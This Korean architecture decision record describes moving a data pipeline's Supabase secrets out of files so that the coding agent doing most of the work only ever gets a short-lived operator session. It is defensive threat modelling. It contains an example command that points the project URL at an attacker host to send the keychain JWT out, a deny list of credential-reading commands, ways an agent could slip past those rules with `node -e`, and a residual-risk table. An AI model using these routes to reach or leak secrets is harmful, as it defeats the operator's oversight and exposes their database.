# ADR-016 — 시크릿은 저장하지 않는다: 운영자가 로그인하고, 스크립트는 그 짧은 세션으로 붙는다

> 최종 수정: 2026-09-21 (v4: **Auth 로그인 모델** — `pnpm data:login` 이 Supabase Auth 사용자(운영자)로 로그인해 access token 하나를 키체인에 넣고,
> `pnpm data:*` 는 publishable 키 + 그 JWT 로 붙는다. RLS 가 `operators` 허용 목록으로 가른다. v3 의 PAT 경로(`supabase projects api-keys`)는 폐기 —
> PAT 는 만료가 없어 "토큰 1일 미만" 요구를 못 채웠다. service_role 키는 GitHub Actions 에만 남는다)
> 이전 (v3: 키체인 스크립트(`pnpm secrets`) 폐기 → CLI 로그인 모델. `supabase login` 만 돼 있으면 스크립트가 실행 시점에 키를 받는다 — 보류 뒤 폐기)
> 이전 (v2: `SUPABASE_URL` 도 키체인으로, 노출된 키는 회전 — 커밋 전 폐기)
> 이전 (v1: 신설 — macOS 키체인 + `scripts/secrets.mjs`. 사용자 결정 "Claude 가 시크릿 값을 읽는 순간부터 문제다")
> 상태: **v4 확정, 구현됨**(마이그레이션 2개 적용, `scripts/login.mjs`·`scripts/lib/sessionKeychain.mjs`·`supabaseClient.mjs`). 보안 리뷰(4 렌즈+적대 검증) 반영.
> **이 설계는 `pnpm data:*` 경로를 가둔다 — 이 머신 자체는 아직 아니다**(아래 "잔존 위험"). 남은 것은 사용자 터미널 작업(env 파일 삭제·CLI 로그아웃·Vercel env 정리·
> 회전)과 대시보드, 그리고 PostgREST 를 통한 엔드투엔드 확인 — [todo/README](../todo/README.md) 다음 할 일.

## 맥락

파이프라인(02 수집·03 분석·`data:pull`)이 로컬에서도 돌아야 해서 DB 쓰기 권한이 로컬에 필요했다. 처음엔 `SUPABASE_SERVICE_ROLE_KEY` 를
`.env.local` 에 두고 읽었는데, 이 레포의 작업 대부분을 에이전트(Claude Code)가 한다 — 에이전트는 디버깅하다 `cat .env.local` 을 치고,
그 값은 대화 기록·서브에이전트 프롬프트·리뷰 워크플로에 실려 밖으로 나간다. **파일에 값이 있는 한 "읽지 마라" 는 규칙은 한 번의 실수로 무너진다.**

세 번 고쳤다. v1 은 키체인에 값을 넣고 관리 스크립트로 꺼내는 방식 — 사용자가 "관리 절차가 하나 더 생긴다" 고 거부. v2 는 그 변형.
v3 은 `supabase login`(PAT) 만 돼 있으면 스크립트가 `projects api-keys` 로 service_role 키를 실행 시점에 받는 방식 — 동작했지만
**PAT 는 만료가 없다.** 사용자가 그린 요구 다섯 개 중 마지막을 못 채웠다:

① Claude 는 시크릿을 모른다 ② 작업자가 있을 때 로그인을 요청한다 ③ 사용자가 직접 로그인한다 ④ 그 토큰으로 쓴다 ⑤ **토큰 유효기간 1일 미만.**

v3 은 로그인 한 번이 영구 service_role 접근이었다. 요구 ⑤는 "에이전트가 무엇을 손에 넣든 하루면 죽는다" 는 뜻이고, 그건 키가 아니라
**세션**이어야 나온다.

## 결정

1. **로컬 스크립트는 service_role 키를 쓰지 않는다.** Supabase Auth 의 사용자(운영자)로 로그인한 **짧은 JWT** 로 PostgREST 에 붙고,
   RLS 가 권한을 가른다. 마이그레이션 `20260921075901_operators_rls`·`20260921080333_is_operator_invoker`:
   - `operators(user_id → auth.users)` 허용 목록. `is_operator()`(security invoker, `search_path = ''`)가 "호출자가 목록에 있는가" 를 답한다.
   - `authenticated` 이면서 운영자인 사용자: `places`·`items`·`blog_posts`·`candidates`·`place_sources` 전부 select/insert/update/delete.
     **`authenticated` 만으로는 아무것도 못 한다** — 원격 프로젝트가 회원가입을 열어 두면 아무나 `authenticated` 가 된다. 허용 목록이 관문이다.
   - `anon`(publishable 키): `places` 의 `status='published'` 와 `items` 를 **select 만**. `scripts/pull-db.mjs` 가 읽는 것과 정확히 같은 집합 —
     이미 사이트에 구워져 공개된 데이터라 새로 노출되는 것이 없다. Vercel 빌드가 이 경로다.
   - 운영자 추가는 SQL 로만(`supabase db query --linked "insert into operators …"`). API 로는 `operators` 를 자기 행 하나만 읽을 수 있다(열거 불가).
2. **`pnpm data:login`(`scripts/login.mjs`)** 이 세션을 만든다. TTY 가 아니거나 `CLAUDECODE` 가 켜져 있으면 거부 — 비밀번호가 에이전트
   대화 기록에 실릴 길을 막는다. 이메일·숨김 비밀번호 → `signInWithPassword` → **access token 만** macOS 키체인(`zgnn` / `SUPABASE_SESSION`)에.
   **refresh token 은 버린다** — 무료 플랜엔 세션 타임박스가 없어 저장하면 사실상 영구 로그인이 된다. 토큰의 `exp` = 대시보드
   Authentication → JWT expiry(8~12시간 권장)가 곧 "하루 한 번 로그인". `pnpm data:logout` 은 키체인 항목만 지운다.
3. **통로는 `scripts/lib/supabaseClient.mjs` 하나.** `createSupabase({ readOnly })` 가 출처를 고른다:
   env `SUPABASE_SERVICE_ROLE_KEY`(**CI 에서만** 받아들인다 — 로컬에 있으면 멈춘다, 트립와이어) → `readOnly` 면 **항상 anon**(세션이 있어도 싣지 않는다 —
   published 만 읽는 스크립트에 운영자 토큰을 실을 이유가 없고, Vercel 과 로컬이 같은 경로로 돈다) → 쓰기 스크립트는 키체인 세션.
   세션은 `exp` 30분 앞을 만료로 본다(20분짜리 `data:analyze` 가 중간에 401 로 죽지 않게 — **JWT expiry ≥ 8시간을 전제한다.** 원격 기본값 3600 인 채면
   로그인 뒤 30분만 쓸 수 있으니 대시보드 값이 먼저다) 하고, **수명이 하루를 넘으면 거부한다**(요구 ⑤를 코드가 단언 — 대시보드 JWT expiry 는 값 없이 검증할 수 없다). **쓰기 스크립트는 세션이 없거나 만료면 그 자리에서 멈추고 `pnpm data:login` 을 안내한다** — anon 으로 보내면
   첫 insert 에서 RLS 42501 로 죽는데 그 메시지는 "로그인하라" 로 읽히지 않는다. `data:pull` 은 결과가 비면 파일을 덮어쓰지 않고 exit 1(빈 사이트 배포 방지).
   어느 출처를 썼는지 **이름만** 한 줄 찍는다(`Supabase 인증: 로그인 세션(JWT …)`) — `data:pull` 은 세 출처 모두 같은 결과를 내서 로그 없이는 구분이 안 된다.
   `GITHUB_ACTIONS=true` 인데 service key 가 없으면 "로그인하라" 가 아니라 시크릿 이름을 말한다.
4. **URL 과 publishable 키는 코드 상수다**(`PROJECT_REF`·`PUBLISHABLE_KEY`). 둘 다 공개값 — ref 는 API 주소의 서브도메인, publishable 키는
   브라우저 번들에 실으라고 만든 키다(방어선은 RLS). 상수인 이유: Vercel·Actions 엔 `supabase/.temp/project-ref`(gitignored)가 없다.
   link 된 ref 가 상수와 다르면 멈춘다 — 스키마(CLI)와 데이터(스크립트)가 다른 프로젝트를 가리키는 사고를 막는다. **URL 은 세션·anon 경로에서 env 로 바꿀 수 없다** —
   바꿀 수 있으면 `SUPABASE_URL=https://attacker pnpm data:apply` 한 줄(허용된 명령)이 키체인 JWT 를 밖으로 보낸다(리뷰 지적). `PUBLISHABLE_KEY` 는 `sb_publishable_` 형식을 단언한다 —
   공개 상수 자리에 secret 키를 붙여 넣어도 PostgREST 는 그대로 돌아서(RLS 우회) 아무 테스트도 못 잡는다.
5. **service_role 키는 GitHub Actions 에만 남는다.** 러너는 로그인할 수 없다. Vercel 에서는 지운다(anon 경로). 값은 사용자가 터미널의
   대화형 프롬프트로 넣는다 — `gh secret set NAME`(숨김 입력에 붙여넣기). 파일을 거치지 않는다.
   **코드가 강제한다**: `resolveSupabaseCredentials` 는 `CI`(Actions `true`·Vercel `1`)가 아니면 env 의 service 키를 **거부하고 멈춘다.** 문서만으로는
   안 됐다 — 구현 당일 옛 `.env.local` 이 남아 있어 `data:pull` 이 세션 없이 service 로 붙는 걸 로그로 발견했다. 그 파일이 곧 "관리자 없이 되는 키" 였다.
6. **레포에 env 파일은 없고, `data:*` 스크립트는 env 파일을 읽지 않는다**(`--env-file-if-exists` 제거 — 파일 한 줄로 service 키·URL 을 주입하는 통로였다).
   `ANALYZE_MODEL` 은 셸 env 로(`ANALYZE_MODEL=… pnpm data:analyze`). `.env.local` 은 `NEXT_PUBLIC_KAKAO_MAP_KEY` 를 바꿀 때만(Next 가 읽는다).
7. **`.claude/settings.json` 의 deny 는 사고 방지 장치지 경계가 아니다.** `Read(./.env*)`·`Bash(security find-generic-password …)`·`Bash(security -i …)`·
   `Bash(supabase projects api-keys …)`(`pnpm exec`·`pnpm`·`npx`·`node_modules/.bin`·`/usr/bin` 접두, 인자 없는 형태 포함)·`Bash(vercel env pull …)`.
   bypass 세션에서도 막히고(`security -i` 는 파이프 안에서도), 이 CLI 버전은 `Read` deny 가 Bash 의 파일 참조(`cat .env.local`)까지 막는 걸 리뷰가 실측했다.
   그래도 경계가 아닌 이유: 키체인은 `node -e` 한 줄로 읽히고(`security` 철자만 막는다), gitignored `.claude/settings.local.json` 의 allow 에는
   `Bash(node -e ' *)`·`Bash(python3 -c ' *)`·`Bash(gh auth *)` 같은 우회 원시가 **무프롬프트로 사전 승인**돼 있다(추적되지 않는 파일은 보안 불변식을 지킬 수 없다 —
   지울지는 사용자 결정). 경계는 세 가지뿐이다: **값이 파일에 없다 · `exp`(≤1일) · RLS 범위.** 키체인 JWT 를 읽어도 하루면 죽고 운영자 권한 밖은 못 한다.

## 왜 이것인가

- **PAT(v3)가 아닌 이유**: 만료가 없다. 요구 ⑤를 못 채운다. 또 PAT 로 받는 건 service_role 키라 RLS 를 통째로 우회한다 — 세션은 RLS 안에서 논다.
- **refresh token 을 버리는 이유**: 무료 플랜엔 "세션 최대 수명" 설정이 없다. refresh 를 저장하면 access token 이 짧아도 의미가 없다.
- **`is_operator()` 를 security definer 로 두지 않는 이유**: 어드바이저 0028/0029 가 definer 함수의 `/rest/v1/rpc` 노출을 경고한다. 실해는 없지만
  경고를 남기면 다음 진짜 경고가 묻힌다. invoker 로 두면 함수 안의 `operators` 조회에 RLS 가 걸리므로 자기 행 정책(`operators_read_self`)이 필요하다 —
  그게 없으면 **에러 없이 조용히 false**(빈 결과)가 된다. 이 함정이 이 결정에서 가장 비직관적인 부분이다.
- **회원가입을 대시보드에서 끄는 이유**: 켜져 있어도 허용 목록 밖이라 아무것도 못 하지만, 불필요한 `auth.users` 행과 이메일 발송이 생긴다.
- **1Password·Doppler 가 아닌 이유**: 도구를 바꿔도 "에이전트가 실행할 수 있는 명령으로 값을 꺼낼 수 있다" 는 구조는 같다. 세션 모델은 꺼내도 하루면 죽는다.
- **로그인된 `supabase` CLI(PAT)는 이 모델의 바깥이다.** 리뷰가 실측했다: 에이전트가 `db query --linked` 를 프롬프트 없이 실행해 `running_as: postgres, bypass_rls: true`.
  PAT 는 만료가 없고 DB 비밀번호도 CLI 키체인에 저장돼 있다 — **관리자 없이 RLS 를 우회하는 영구 키**가 하나 남아 있는 셈이다. 그래서 휴지 상태는 **로그아웃**
  (`pnpm exec supabase logout`)이고, 스키마 작업(`db push`·`operators` insert)이 필요할 때만 사용자가 로그인하고 끝나면 다시 로그아웃한다. "에이전트도 `db query` 를
  할 수 있다" 는 이전 문장은 이 리뷰로 철회한다.

## 결과

- 사용자: 하루 한 번 `pnpm data:login`(별도 터미널). 만료되면 `pnpm data:*` 가 "로그인 세션이 만료됐다(시각) — pnpm data:login" 으로 멈춘다.
- 에이전트: 사용자가 로그인한 동안 `pnpm data:*` 실행·결과 확인·Actions 로그는 가능. `supabase db query`·`db push` 는 사용자가 CLI 로그인을 열어 준 동안만.
- 회전 절차: service_role 은 대시보드에서 새 secret 키 발급(옛 키 폐기) → `gh secret set SUPABASE_SERVICE_ROLE_KEY`. Vercel·로컬은 없음.
  운영자 비밀번호는 대시보드 Users 에서 바꾸고 `pnpm data:login` 을 다시.
- 확인 방법: **RLS 는 PostgREST 를 통해서만 검증한다** — `supabase db query`(postgres 역할)도 service_role 도 RLS 를 우회해서 정책이 깨져 있어도
  멀쩡해 보인다. anon 이 정책 없는 테이블(`candidates`)에서 `[]`, 운영자 JWT 가 같은 테이블에서 행(또는 insert 성공)을 얻으면 정책이 산 것이다.
  `data:pull` 은 항상 anon 이라 세션의 증거가 못 된다 — 세션 확인은 `pnpm data:apply --dry-run`: 운영자면 `반영 0건` exit 0, 비운영자면 정책이 닫혀
  `places 가 비어 있다` exit 1, 세션 없으면 로그인 안내. 쓰지 않으면서 세 경우가 갈린다.
  **2026-09-21 (4) PostgREST 로 실측 완료** — anon: `pnpm data:pull` 이 `publishable(anon)` 으로 86·15 행, diff 없음. 세션: `pnpm data:apply --dry-run` 이
  세션 없음 → 로그인 안내 exit 1 · 비운영자(`zgnn-test@gmail.com`, `operators` 밖) → `places 가 비어 있다` exit 1 · 운영자(`zgnn@gmail.com`) → `반영 0건` exit 0.
  같은 코드·같은 테이블에서 계정만 바꿔 세 결과가 갈렸으므로 정책이 산 것이다. 단, 원격 JWT expiry 는 기본 3600 그대로(사용자 결정) — 30분 skew 와 합치면 실효 세션이 30분이라
  긴 `data:analyze` 전에 43200 으로 올리거나 skew 를 줄여야 한다.
- 실측(2026-09-21): 마이그레이션 2개 push, 어드바이저 "No issues found", 키체인 쓰기·덮어쓰기·삭제·형식 거부 스모크 통과, `resolveSupabaseCredentials`
  분기 14 테스트. `pnpm data:login </dev/null` 은 TTY 가드로 exit 1. PostgREST 경유 확인은 publishable 키·운영자 계정이 생긴 뒤(다음 할 일 1·2).
- **남아 있던 구멍(2026-09-21 발견, 사용자가 지운다)**: `.env.local`(`SUPABASE_SERVICE_ROLE_KEY`·`SUPABASE_URL`·`VERCEL_OIDC_TOKEN`)과
  `.vercel/.env.production.local`(BUG-005 재현 때 service 키를 손으로 넣고 안 지운 것 + 마켓플레이스 변수 34개, `POSTGRES_PASSWORD` 등은 `[SENSITIVE]` 자리표시자).
  에이전트의 `rm` 은 권한 거부돼 사용자 터미널에서 `rm -f .env.local .vercel/.env.production.local`. 그 전까지도 CI 가드 덕에 스크립트는 그 키를 쓰지 않는다.
- **`pnpm login`·`pnpm logout` 은 pnpm 내장 명령**(npm 레지스트리 로그인)이라 package.json 의 `login` 스크립트를 가린다 — 그래서 `data:login`·`data:logout` 이다.

## 잔존 위험 — 이 머신에서 "관리자 없이 되는 것" (보안 리뷰 2026-09-21, 4 렌즈 일치)

설계는 `pnpm data:*` 경로에서 요구 ①~⑤를 채운다. 그러나 이 머신에는 그 경로 밖에서 관리자 없이·만료 없이 DB 나 시크릿에 닿는 자격증명이 있다.
전부 **사용자 터미널** 작업이고, 끝나야 "에이전트가 쥔 키 0 · 관리자 없이는 작동 불가" 가 사실이 된다:

| # | 경로 | 실측 | 닫는 방법(사용자) |
|---|---|---|---|
| 1 | 옛 `.env.local`·`.vercel/.env.production.local` 에 service_role 평문 | 이름 확인(값 안 봄). 에이전트 `rm` 은 권한 거부 | `rm -f .env.local .vercel/.env.production.local` |
| 2 | `supabase` CLI PAT + 저장된 DB 비밀번호 → `db query --linked` 가 postgres(RLS 우회) | 리뷰 에이전트가 프롬프트 없이 실행 | `pnpm exec supabase logout`. 스키마 작업 때만 로그인 |
| 3 | Vercel env 의 `SUPABASE_JWT_SECRET`·`SUPABASE_SECRET_KEY`·`POSTGRES_PASSWORD`·`SUPABASE_SERVICE_ROLE_KEY` — 아무 브랜치 push 가 그 env 로 빌드를 돌린다(`buildCommand` 가 레포 안) | `vercel env ls` 이름 | 마켓플레이스 연동 해제 + `vercel env rm` 전부. **JWT secret 은 service_role JWT 를 무기한 위조**할 수 있어 새 서명키로 회전 검토 |
| 4 | 레포 admin `gh` 계정 + 암호구 없는 SSH 키 → 워크플로 수정 push + `workflow_dispatch` 로 GitHub Secrets 회수(Free private 레포는 브랜치·환경 보호 불가) | `gh auth status`·`ssh -T` | `gh auth logout -u hoiya-woohyun`(휴지), SSH 키 암호구 + `ssh-add -t 8h`. 시크릿 등록 때만 로그인 |
| 5 | `vercel` CLI 토큰(무만료) — 배포·env 변경 | `vercel whoami` | 휴지 상태 `vercel logout`, 배포 확인 때만 로그인 |

**보류(다음 결정)**: (a) GitHub Actions 의 service_role 을 **봇 운영자 로그인**(`signInWithPassword`, RLS 안)으로 바꾸면 RLS 우회 키가 어디에도 남지 않는다 —
구현은 작지만(CI 경로 하나) 봇 계정·시크릿 2개가 필요해 사용자 결정 뒤에. (b) anon·authenticated 의 기본 GRANT(DELETE·TRUNCATE·TRIGGER)를 회수하고 `for all` 을
select/insert/update 로 좁힌다 — 어떤 스크립트도 delete 하지 않으므로 파괴 반경을 줄인다. (c) Actions 자체가 "관리자 없이" 도는 구조라 `CLAUDE_CODE_OAUTH_TOKEN`
(구독 계정)도 4 의 경로로 빠질 수 있다 — 수집·분석을 로컬(세션)에서만 돌리는 선택지 포함.
